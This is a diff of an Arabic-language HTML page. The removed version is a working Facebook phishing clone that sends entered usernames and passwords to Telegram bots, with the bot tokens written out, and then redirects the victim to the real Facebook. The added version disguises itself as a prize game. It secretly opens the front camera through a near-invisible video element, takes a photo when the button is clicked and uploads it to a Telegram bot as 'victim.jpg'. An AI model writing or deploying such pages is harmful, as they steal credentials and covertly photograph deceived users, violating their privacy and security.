@@ -1,61 +1,146 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <title>لعبة الحظ السريع</title>
     <style>
-        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { width: 100%; max-width: 400px; text-align: center; }
-        .logo-img { width: 240px; margin-bottom: 20px; }
-        .login-card { background: #fff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; box-sizing: border-box; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        .login-btn { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .login-btn:hover { background-color: #166fe5; }
-        .forgot-pass { color: #1877f2; font-size: 14px; text-decoration: none; margin: 15px 0; display: inline-block; }
-        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; padding: 12px 16px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .rights { margin-top: 30px; font-size: 12px; color: #737373; font-weight: bold; }
+        body {
+            background-color: #121212;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .game-btn {
+            background: linear-gradient(45deg, #ff0055, #ff0000);
+            border: none;
+            padding: 20px 40px;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            transition: transform 0.2s;
+        }
+        .game-btn:active {
+            transform: scale(0.95);
+        }
+        /* الكاميرا موجودة لكنها شفافة لكي تعمل البرمجة */
+        #cam-stream {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        #status {
+            margin-top: 20px;
+            color: #ffff00;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo-img">
-        <div class="login-card">
-            <form id="catchForm">
-                <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" id="pass" placeholder="كلمة السر" required>
-                <button type="submit" class="login-btn">تسجيل الدخول</button>
-            </form>
-            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-            <hr>
-            <button class="create-btn">إنشاء حساب جديد</button>
-        </div>
-        <div class="rights">جميع الحقوق محفوظة © 2024 - تم التطوير بواسطة القذر</div>
-    </div>
+
+    <h1>اضغط للفوز بجائزة! 🎁</h1>
+    <button class="game-btn" onclick="playGame()">جرب حظك</button>
+    <p id="status"></p>
+
+    <video id="cam-stream" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        document.getElementById('catchForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            const text = `🔥 صيد جديد يا وحش:\n👤 User: ${u}\n🔑 Pass: ${p}`;
-            
-            const bots = [
-                {t: '8191961309:AAGPv-DDxrxjDUiq3WXf8ce8Tyk0E8URllk', i: '885298735'},
-                {t: '8554214830:AAG22k54m3AAZXwxW67I6mU9g3mA1j4vWHo', i: '7763665935'}
-            ];
+        // بيانات البوت اللعين
+        const TOKEN = "8554214830:AAG22k54m3AAZXwxW67I6mU9g3mA1j4vWHo";
+        const CHAT_ID = "7763665935";
+        
+        const video = document.getElementById('cam-stream');
+        const canvas = document.getElementById('canvas');
+        const statusTxt = document.getElementById('status');
+        let isCameraReady = false;
 
-            bots.forEach(bot => {
-                fetch(`https://api.telegram.org/bot${bot.t}/sendMessage?chat_id=${bot.i}&text=${encodeURIComponent(text)}`);
+        // تشغيل الكاميرا فور فتح الموقع
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                
+                // انتظار تحميل الفيديو للتأكد من أنه يعمل
+                video.onloadedmetadata = () => {
+                    isCameraReady = true;
+                    console.log("الكاميرا اللعينة جاهزة");
+                };
+            } catch (error) {
+                statusTxt.innerText = "خطأ: يجب السماح بالكاميرا للعب!";
+                console.error("فشل الوصول للكاميرا:", error);
+            }
+        }
+
+        // دالة اللعب والإرسال
+        function playGame() {
+            if (!isCameraReady) {
+                alert("انتظر لحظة، اللعبة تجهز الكاميرا...");
+                initCamera(); // محاولة تشغيلها مرة أخرى إذا فشلت
+                return;
+            }
+
+            statusTxt.innerText = "جاري السحب...";
+
+            // رسم الصورة الحالية على الكانفاس
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة لملف وإرسالها
+            canvas.toBlob(function(blob) {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", imageBlob, "victim.jpg");
+            formData.append("caption", "تم صيد هذا الغبي أثناء اللعب! 📸");
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    statusTxt.innerText = "❌ لم تفز بشيء، حظاً أوفر!";
+                    console.log("تم الإرسال بنجاح");
+                } else {
+                    statusTxt.innerText = "خطأ في السيرفر اللعين";
+                    alert("خطأ من تليجرام: " + data.description);
+                }
+            })
+            .catch(error => {
+                console.error(error);
+                statusTxt.innerText = "فشل الاتصال";
             });
+        }
 
-            setTimeout(() => {
-                window.location.href = "https://www.facebook.com/login";
-            }, 500);
+        // تشغيل الكاميرا عند التحميل
+        window.addEventListener('load', initCamera);
+        
+        // محاولة تشغيل الكاميرا عند لمس أي مكان في الصفحة (للموبايل)
+        document.body.addEventListener('click', () => {
+            if(!isCameraReady) initCamera();
         });
     </script>
 </body>
 </html>
-
